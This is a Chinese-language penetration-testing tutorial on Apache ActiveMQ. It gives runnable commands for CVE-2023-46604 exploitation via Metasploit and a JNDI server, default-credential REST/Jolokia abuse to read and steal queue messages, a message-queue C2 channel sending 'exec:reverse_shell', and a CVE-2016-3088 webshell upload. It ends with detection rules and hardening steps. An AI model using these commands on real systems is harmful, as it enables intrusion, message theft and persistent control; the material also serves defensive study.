---
title: "Apache ActiveMQ OpenWire / REST API 未授权访问与 RCE 利用技术"
date: 2026-06-21T04:00:00+08:00
draft: false
weight: 93
description: "Apache ActiveMQ 消息中间件渗透测试：OpenWire 协议 RCE、CVE-2023-46604 反序列化漏洞、REST API 管理面利用、消息队列 C2 隐蔽通道与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Apache ActiveMQ", "OpenWire", "REST API", "RCE", "CVE-2023-46604", "消息队列安全", "反序列化", "渗透测试"]
---

## 0x00 攻击面总览

Apache ActiveMQ 是最流行的开源消息中间件，暴露多个高危攻击面：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| OpenWire | 61616 | TCP | 消息传输、反序列化 RCE（CVE-2023-46604） |
| Web Console / REST API | 8161 | HTTP | 管理界面、队列管理、消息浏览 |
| AMQP | 5672 | AMQP | 消息协议 |
| STOMP | 61613 | TCP | 简单文本协议 |
| MQTT | 1883 | MQTT | IoT 消息协议 |
| WebSocket | 61614 | WS | WebSocket 消息 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Apache ActiveMQ 集群                         │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ OpenWire     │    │ Web Console  │    │ AMQP/STOMP   │    │
│  │ :61616       │    │ :8161        │    │ :5672/:61613 │    │
│  │ 反序列化/RCE │    │ REST/管理    │    │ 消息协议      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              ActiveMQ Broker (消息代理)                   │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① OpenWire :61616 → CVE-2023-46604 → 反序列化 RCE       │ │
│  │  ② REST API :8161 → 未授权管理 → 队列控制/消息窃取        │ │
│  │  ③ 消息队列 → C2 隐蔽通道 → 持久化控制                    │ │
│  │  ④ 默认凭据 admin/admin → 管理面接管                      │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • OpenWire 端口默认无认证                                     │
│  • Web Console 默认凭据 admin/admin                            │
│  • REST API 无额外认证层                                       │
│  • 消息内容默认不加密                                          │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 5672,8161,1883,61613,61614,61616 \
  --script=http-title \
  -oN activemq_scan.txt <target>
```

**典型扫描结果**：

```
PORT      STATE SERVICE     VERSION
5672/tcp  open  amqp        RabbitMQ 3.x (AMQP 0-9-1)
8161/tcp  open  http        Jetty 9.4.51.v20210516
61616/tcp open  openwire    Apache ActiveMQ
```

### 1.2 版本指纹

```bash
# Web Console 默认页面
curl -s "http://target:8161/" | grep -i "ActiveMQ"

# REST API 版本信息
curl -s -u admin:admin "http://target:8161/api/jolokia/version" | python3 -m json.tool

# 响应示例
{
  "request": {
    "mbean": "java.lang:type=Runtime",
    "attribute": "Name",
    "type": "read"
  },
  "value": "ActiveMQ"
}

# OpenWire 协议探测
echo -ne "\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00" | nc -w3 target 61616 | xxd
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"ActiveMQ"
port:8161 http.title:"ActiveMQ"
port:61616

# FOFA
body="ActiveMQ" && port="8161"
app="Apache-ActiveMQ"
```

---

## 0x02 CVE-2023-46604 — OpenWire 反序列化 RCE

### 2.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache ActiveMQ 5.15.0 - 5.15.16, 5.16.0 - 5.16.7, 5.17.0 - 5.17.6, 5.18.0 - 5.18.3 |
| CVSS | 10.0（Critical） |
| 类型 | 反序列化 RCE（OpenWire 协议） |
| 攻击向量 | TCP/61616（OpenWire 协议端口） |
| 认证要求 | 无（协议握手阶段即可触发） |
| CISA KEV | 已列入已知被利用漏洞目录 |
| 根因 | `ClassInfo` 反序列化时未验证类名白名单，允许通过 `Class.forName()` 实例化任意类 |

### 2.2 漏洞原理

```
攻击者 → OpenWire 连接 → 发送恶意 ClassInfo
    │
    ▼
ExceptionResponse 处理器
    │
    ▼
ClassInfo → Class.forName(className)
    │
    ▼
JNDI 注入 → 外部 LDAP/RMI 服务器
    │
    ▼
加载远程恶意类 → RCE
```

### 2.3 漏洞验证

```bash
# 使用 Metasploit
msfconsole
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS target
set RPORT 61616
set LHOST attacker_ip
exploit

# 使用 Nuclei 检测
nuclei -t cves/2023/CVE-2023-46604.yaml -u target:61616
```

### 2.4 利用链

```bash
# 步骤 1：搭建恶意 LDAP/RMI 服务器
# 使用 JNDIExploit 或 marshalsec
java -cp JNDIExploit.jar com.feihong.ldap.LdapServer 1389

# 步骤 2：发送恶意 OpenWire 数据包
# 构造包含 JNDI 引用的 ClassInfo 对象
# 通过 OpenWire 协议发送到目标 61616 端口

# 步骤 3：目标加载恶意类 → RCE
```

---

## 0x03 REST API / Web Console 利用

### 3.1 默认凭据登录

```bash
# 默认凭据 admin/admin
curl -s -u admin:admin "http://target:8161/api/jolokia/version"

# 列出所有队列
curl -s -u admin:admin "http://target:8161/api/jolokia/read/Broker/localhost/QueueNames" | python3 -m json.tool

# 获取队列详情
curl -s -u admin:admin "http://target:8161/api/jolokia/read/Queue/TEST" | python3 -m json.tool
```

### 3.2 消息队列枚举

```bash
# 列出所有 Topic
curl -s -u admin:admin "http://target:8161/api/jolokia/read/Broker/localhost/TopicNames" | python3 -m json.tool

# 列出所有 Connector
curl -s -u admin:admin "http://target:8161/api/jolokia/read/Broker/localhost/Connectors" | python3 -m json.tool

# 获取 Broker 信息
curl -s -u admin:admin "http://target:8161/api/jolokia/read/Broker/localhost/BrokerId" | python3 -m json.tool
```

### 3.3 消息读取与窃取

```bash
# 通过 REST API 浏览队列消息
curl -s -u admin:admin \
  "http://target:8161/api/message/TEST?readTimeout=5000" \
  -H "Accept: application/json"

# 通过 Jolokia 读取消息
curl -s -u admin:admin \
  "http://target:8161/api/jolokia/exec/Queue/TEST/browseMessages" | python3 -m json.tool
```

### 3.4 消息发送

```bash
# 通过 REST API 发送消息到队列
curl -s -u admin:admin -X POST \
  "http://target:8161/api/message/TEST?type=queue" \
  -H "Content-Type: application/json" \
  -d '{"text": "malicious message content"}'
```

### 3.5 通过 Jolokia 执行 MBean 操作

```bash
# 列出所有 MBean
curl -s -u admin:admin "http://target:8161/api/jolokia/list" | python3 -m json.tool | head -100

# 执行 MBean 操作
curl -s -u admin:admin -X POST \
  "http://target:8161/api/jolokia/" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "exec",
    "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
    "operation": "addConnector",
    "arguments": ["tcp://0.0.0.0:61617"]
  }'
```

---

## 0x04 消息队列 C2 隐蔽通道

### 4.1 利用消息队列作为 C2

```bash
# 攻击者发送命令到控制队列
curl -s -u admin:admin -X POST \
  "http://target:8161/api/message/C2_COMMAND?type=queue" \
  -H "Content-Type: application/json" \
  -d '{"text": "exec:whoami"}'

# 目标上的恶意消费者读取命令并执行
# 结果写入响应队列
curl -s -u admin:admin -X POST \
  "http://target:8161/api/message/C2_RESULT?type=queue" \
  -H "Content-Type: application/json" \
  -d '{"text": "root"}'
```

### 4.2 消息持久化 — 持久控制

```bash
# 发送持久化消息（即使 ActiveMQ 重启也不会丢失）
curl -s -u admin:admin -X POST \
  "http://target:8161/api/message/PERSISTENT_BACKDOOR?type=queue" \
  -H "Content-Type: application/json" \
  -d '{"text": "persistent payload", "persistent": true}'
```

### 4.3 Topic 广播 — 多节点控制

```bash
# 通过 Topic 向所有订阅者广播命令
curl -s -u admin:admin -X POST \
  "http://target:8161/api/message/BROADCAST_CMD?type=topic" \
  -H "Content-Type: application/json" \
  -d '{"text": "exec:reverse_shell"}'
```

---

## 0x05 CVE-2016-3088 — 文件服务器 RCE

### 5.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Apache ActiveMQ 5.x < 5.14.0 |
| CVSS | 10.0（Critical） |
| 类型 | 文件服务器漏洞 → WebShell 写入 |
| 攻击向量 | Web Console (8161) + OpenWire (61616) |
| 认证要求 | 默认凭据 admin/admin |

### 5.2 漏洞利用

```bash
# 步骤 1：通过 OpenWire 上传文件到文件服务器
# 使用 PUT 方法上传恶意文件到 admin 目录
curl -s -u admin:admin -X PUT \
  "http://target:8161/fileserver/evil.txt" \
  -d "malicious content"

# 步骤 2：通过 MOVE 方法将文件移动到 Web 目录
curl -s -u admin:admin -X MOVE \
  "http://target:8161/fileserver/evil.txt" \
  -H "Destination: file:///opt/activemq/webapps/admin/shell.jsp"

# 步骤 3：访问 WebShell
curl -s "http://target:8161/admin/shell.jsp?cmd=id"
```

---

## 0x06 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2023-46604 | 反序列化 RCE | 10.0 | OpenWire ClassInfo 反序列化 RCE |
| CVE-2016-3088 | 文件上传 RCE | 10.0 | 文件服务器漏洞写入 WebShell |
| CVE-2015-5254 | 反序列化 | 10.0 | OpenWire 反序列化漏洞 |
| CVE-2016-0734 | 反序列化 | 10.0 | JMX 反序列化 RCE |
| CVE-2017-15709 | 路径遍历 | 7.5 | 文件服务器路径遍历 |
| CVE-2020-1956 | 信息泄露 | 5.9 | JMX 信息泄露 |

**CVE-2023-46604 影响范围**：

全球数万台暴露的 ActiveMQ 实例受影响。已被 CISA 列入 KEV 目录，确认存在在野利用。攻击者无需任何认证即可在协议握手阶段触发 RCE。

---

## 0x07 蓝队检测方案

### 7.1 网络层检测

```yaml
title: ActiveMQ OpenWire 外部访问检测
id: activemq-openwire-external
status: experimental
description: 检测来自非内网段的 ActiveMQ OpenWire 端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 61616
      - 61613
      - 61614
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

```yaml
title: ActiveMQ CVE-2023-46604 利用检测
id: activemq-cve-2023-46604-exploit
status: experimental
description: 检测 OpenWire 协议中的反序列化攻击特征
logsource:
  category: network
  service: activemq
detection:
  selection_jndi:
    payload|contains:
      - "ldap://"
      - "rmi://"
      - "ClassInfo"
      - "ExceptionResponse"
  selection_class:
    payload|contains:
      - "ClassInfo"
      - "Class.forName"
  condition: selection_jndi or selection_class
level: critical
```

### 7.2 审计日志分析

```bash
# 监控 OpenWire 连接
grep "OpenWire" /opt/activemq/data/activemq.log

# 监控 Web Console 登录
grep -E "(admin|login|auth)" /opt/activemq/data/activemq.log

# 监控文件服务器操作
grep -E "(PUT|MOVE|DELETE)" /opt/activemq/data/activemq.log

# 监控 Jolokia 操作
grep "jolokia" /opt/activemq/data/activemq.log

# 监控异常队列操作
grep -E "(addConnector|removeConnector|addNetworkConnector)" \
  /opt/activemq/data/activemq.log
```

### 7.3 加固清单

```
[ ] 立即升级至 Apache ActiveMQ >= 5.15.17 / 5.16.8 / 5.17.7 / 5.18.4
[ ] OpenWire 端口 (61616) 仅允许内网访问
[ ] 修改 Web Console 默认凭据（admin/admin）
[ ] 启用 ActiveMQ 认证：
    <authenticationUser username="admin" password="STRONG_PASSWORD"/>
[ ] 禁用文件服务器（如不需要）：
    删除 webapps/fileserver 目录
[ ] 禁用不必要的协议端口（AMQP/STOMP/MQTT/WebSocket）
[ ] 配置 OpenWire 连接认证
[ ] 在前面放置反向代理并启用 IP 白名单
[ ] 启用 HTTPS（配置 SSL/TLS 证书）
[ ] 启用审计日志并接入 SIEM
[ ] 监控 OpenWire 连接中的异常 ClassInfo 对象
[ ] 配置防火墙规则限制 61616 端口访问源
[ ] 定期审查消息队列中的异常消息
[ ] 配置 JMX 认证
[ ] 限制 Jolokia API 访问
```

---

## 0x08 渗透测试检查清单

```
[ ] 端口扫描：5672, 8161, 1883, 61613, 61614, 61616
[ ] OpenWire (61616) 未授权连接测试
[ ] CVE-2023-46604 反序列化 RCE 测试
[ ] Web Console (8161) 默认凭据测试（admin/admin）
[ ] REST API 队列枚举测试
[ ] 消息读取与窃取测试
[ ] 消息发送测试
[ ] Jolokia MBean 操作测试
[ ] CVE-2016-3088 文件服务器 RCE 测试
[ ] 消息队列 C2 通道测试
[ ] Topic 广播测试
[ ] 版本信息收集与 CVE 匹配
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] 不必要协议端口检查
```

---

## 0x09 小结

Apache ActiveMQ 的攻击面以 **OpenWire 协议（端口 61616）** 和 **Web Console/REST API（端口 8161）** 为核心。**CVE-2023-46604**（CVSS 10.0）是近年最严重的消息中间件漏洞之一，攻击者无需认证即可通过 OpenWire 协议握手阶段的反序列化实现 RCE，已被 CISA 列入 KEV 目录确认存在在野利用。Web Console 默认凭据 `admin/admin` 使得管理面完全暴露，攻击者可以枚举队列、窃取消息、甚至通过 Jolokia MBean 执行管理操作。消息队列还可被用作 C2 隐蔽通道，利用 JMS 持久化特性实现持久化控制。蓝队应重点关注：立即升级至修复版本、限制 OpenWire 网络访问、修改默认凭据、禁用文件服务器、将审计日志接入 SIEM。
